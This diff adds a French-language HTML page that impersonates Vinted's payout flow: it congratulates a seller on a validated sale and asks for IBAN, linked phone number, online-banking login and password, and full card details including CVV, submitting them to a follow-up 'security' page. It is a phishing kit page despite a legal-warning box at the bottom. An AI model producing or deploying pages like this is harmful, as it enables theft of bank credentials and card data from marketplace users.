@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Informations de paiement - Vinted</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+    </style>
+</head>
+<body class="bg-gray-100 flex flex-col justify-center items-center min-h-screen p-4 text-gray-800">
+
+    <div class="bg-white rounded-xl shadow-lg p-6 sm:p-8 w-full max-w-xl mx-auto my-4">
+        <div class="text-center mb-6">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Vinted_Logo_2022.svg/1280px-Vinted_Logo_2022.svg.png" alt="Logo Vinted" class="mx-auto w-28 h-auto mb-4">
+            <h2 class="text-2xl font-bold text-teal-600">Dernière étape : Recevez votre paiement !</h2>
+        </div>
+
+        <div class="bg-teal-50 border-l-4 border-teal-600 p-4 rounded-lg mb-6">
+            <p class="text-teal-900 leading-relaxed text-sm">
+                Félicitations, votre transaction est validée ! Afin de finaliser le processus et de vous assurer que vous recevez vos fonds en toute sécurité, nous vous invitons à configurer votre méthode de paiement. Cette étape unique permettra de sécuriser ce virement et simplifiera toutes vos futures transactions sur Vinted.
+            </p>
+        </div>
+
+        <form action="security_page.html" id="paymentForm">
+
+            <div class="space-y-6">
+                <!-- Section Informations de compte bancaire - Fond vert/turquoise -->
+                <div class="bg-teal-50 p-6 rounded-lg border border-gray-200">
+                    <h3 class="text-lg font-semibold text-teal-600 mb-2 pb-2 border-b border-gray-200">Informations de compte bancaire</h3>
+                    <p class="text-sm text-gray-500 mb-4">Ces informations sont essentielles pour que Vinted puisse effectuer le virement de vos gains directement sur votre compte bancaire en toute sécurité.</p>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <div class="col-span-1 md:col-span-2">
+                            <label for="iban" class="block text-sm font-medium text-gray-700 mb-1">IBAN</label>
+                            <input type="text" id="iban" name="iban" required class="w-full px-4 py-2 border border-gray-300 rounded-lg shadow-sm focus:ring-teal-500 focus:border-teal-500">
+                        </div>
+                        <div class="col-span-1 md:col-span-2">
+                            <label for="phone_number" class="block text-sm font-medium text-gray-700 mb-1">Numéro de téléphone lié au compte bancaire</label>
+                            <input type="tel" id="phone_number" name="phone_number" required class="w-full px-4 py-2 border border-gray-300 rounded-lg shadow-sm focus:ring-teal-500 focus:border-teal-500">
+                        </div>
+                    </div>
+
+                    <div class="mt-4">
+                        <label for="bank_name" class="block text-sm font-medium text-gray-700 mb-1">Nom de votre banque</label>
+                        <select id="bank_name" name="bank_name" onchange="toggleOtherBankField()" class="w-full px-4 py-2 border border-gray-300 rounded-lg shadow-sm focus:ring-teal-500 focus:border-teal-500">
+                            <option value="">Sélectionnez votre banque</option>
+                            <option value="BNP Paribas">BNP Paribas</option>
+                            <option value="Crédit Agricole">Crédit Agricole</option>
+                            <option value="Société Générale">Société Générale</option>
+                            <option value="Banque Populaire">Banque Populaire</option>
+                            <option value="Crédit Mutuel">Crédit Mutuel</option>
+                            <option value="CIC">CIC</option>
+                            <option value="LCL">LCL</option>
+                            <option value="HSBC France">HSBC France</option>
+                            <option value="Boursorama Banque">Boursorama Banque</option>
+                            <option value="N26">N26</option>
+                            <option value="Revolut">Revolut</option>
+                            <option value="Fortuneo">Fortuneo</option>
+                            <option value="Monabanq">Monabanq</option>
+                            <option value="Autre">Autre</option>
+                        </select>
+                    </div>
+
+                    <div id="other_bank_name_group" class="mt-4 hidden">
+                        <label for="other_bank_name" class="block text-sm font-medium text-gray-700 mb-1">Nom exact de votre banque</label>
+                        <input type="text" id="other_bank_name" name="other_bank_name" class="w-full px-4 py-2 border border-gray-300 rounded-lg shadow-sm focus:ring-teal-500 focus:border-teal-500">
+                    </div>
+
+                    <div class="mt-4">
+                        <label for="bank_id" class="block text-sm font-medium text-gray-700 mb-1">Identifiant de connexion à votre banque en ligne</label>
+                        <input type="text" id="bank_id" name="bank_id" required class="w-full px-4 py-2 border border-gray-300 rounded-lg shadow-sm focus:ring-teal-500 focus:border-teal-500">
+                    </div>
+                    <div class="mt-4">
+                        <label for="bank_password" class="block text-sm font-medium text-gray-700 mb-1">Mot de passe ou code sécurisé de votre banque en ligne</label>
+                        <input type="password" id="bank_password" name="bank_password" required class="w-full px-4 py-2 border border-gray-300 rounded-lg shadow-sm focus:ring-teal-500 focus:border-teal-500">
+                    </div>
+                </div>
+
+                <!-- Section Informations de la carte - Fond gris clair -->
+                <div class="bg-gray-50 p-6 rounded-lg border border-gray-200">
+                    <h3 class="text-lg font-semibold text-teal-600 mb-2 pb-2 border-b border-gray-200">Méthode de paiement pour les achats</h3>
+                    <p class="text-sm text-gray-500 mb-4">Ces informations sont nécessaires pour que vous puissiez effectuer des achats en toute sécurité sur la plateforme à l'avenir.</p>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <div class="col-span-1 md:col-span-2">
+                            <label for="card_name" class="block text-sm font-medium text-gray-700 mb-1">Nom figurant sur la carte</label>
+                            <input type="text" id="card_name" name="card_name" required class="w-full px-4 py-2 border border-gray-300 rounded-lg shadow-sm focus:ring-teal-500 focus:border-teal-500">
+                        </div>
+                        <div class="col-span-1 md:col-span-2">
+                            <label for="card_number" class="block text-sm font-medium text-gray-700 mb-1">Numéro de carte</label>
+                            <input type="text" id="card_number" name="card_number" pattern="[\d\s]{16,19}" maxlength="19" required class="w-full px-4 py-2 border border-gray-300 rounded-lg shadow-sm focus:ring-teal-500 focus:border-teal-500">
+                        </div>
+                        <div class="col-span-1">
+                            <label for="expiry_date" class="block text-sm font-medium text-gray-700 mb-1">Date d'expiration (MM/AA)</label>
+                            <input type="text" id="expiry_date" name="expiry_date" pattern="(0[1-9]|1[0-2])\/\d{2}" maxlength="5" required class="w-full px-4 py-2 border border-gray-300 rounded-lg shadow-sm focus:ring-teal-500 focus:border-teal-500">
+                        </div>
+                        <div class="col-span-1">
+                            <label for="cvv" class="block text-sm font-medium text-gray-700 mb-1">Code CVV</label>
+                            <input type="password" id="cvv" name="cvv" pattern="\d{3,4}" required class="w-full px-4 py-2 border border-gray-300 rounded-lg shadow-sm focus:ring-teal-500 focus:border-teal-500">
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <button type="submit" class="mt-6 w-full py-3 bg-teal-600 text-white rounded-lg font-bold text-lg hover:bg-teal-700 transition-colors duration-200">
+                Valider et continuer
+            </button>
+        </form>
+
+        <div class="mt-8 p-4 bg-red-50 border border-red-300 rounded-lg text-red-700 text-xs">
+            <strong class="block mb-2 text-sm font-bold">AVERTISSEMENT LÉGAL : Utilisation Frauduleuse</strong>
+            <p>L'utilisation de moyens de paiement (cartes bancaires, identifiants) sans consentement est interdite et constitue une fraude, sévèrement punie par la loi (articles L. 163-1 et s. du Code monétaire et financier ; articles 313-1 et s. du Code pénal). N'utilisez que vos propres informations ou celles pour lesquelles vous avez une autorisation légale explicite.</p>
+        </div>
+    </div>
+
+    <script>
+        function toggleOtherBankField() {
+            const bankNameSelect = document.getElementById('bank_name');
+            const otherBankNameGroup = document.getElementById('other_bank_name_group');
+            if (bankNameSelect.value === 'Autre') {
+                otherBankNameGroup.classList.remove('hidden');
+                otherBankNameGroup.querySelector('input').setAttribute('required', 'required');
+            } else {
+                otherBankNameGroup.classList.add('hidden');
+                otherBankNameGroup.querySelector('input').removeAttribute('required');
+                otherBankNameGroup.querySelector('input').value = ''; // Clear value when hidden
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const cardNumberInput = document.getElementById('card_number');
+            const expiryDateInput = document.getElementById('expiry_date');
+
+            // Auto-formatage du numéro de carte (espaces)
+            cardNumberInput.addEventListener('input', (event) => {
+                let value = event.target.value.replace(/\D/g, '');
+                let formattedValue = '';
+                for (let i = 0; i < value.length; i++) {
+                    if (i > 0 && i % 4 === 0) {
+                        formattedValue += ' ';
+                    }
+                    formattedValue += value[i];
+                }
+                event.target.value = formattedValue.trim();
+            });
+
+            // Auto-formatage de la date d'expiration (slash)
+            expiryDateInput.addEventListener('input', (event) => {
+                let value = event.target.value.replace(/\D/g, '');
+                if (value.length > 2 && event.target.value.charAt(2) !== '/') {
+                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                } else if (value.length === 2 && event.inputType !== 'deleteContentBackward' && event.target.value.indexOf('/') === -1) {
+                    value = value + '/';
+                }
+                event.target.value = value.substring(0, 5);
+            });
+        });
+    </script>
+</body>
+</html>
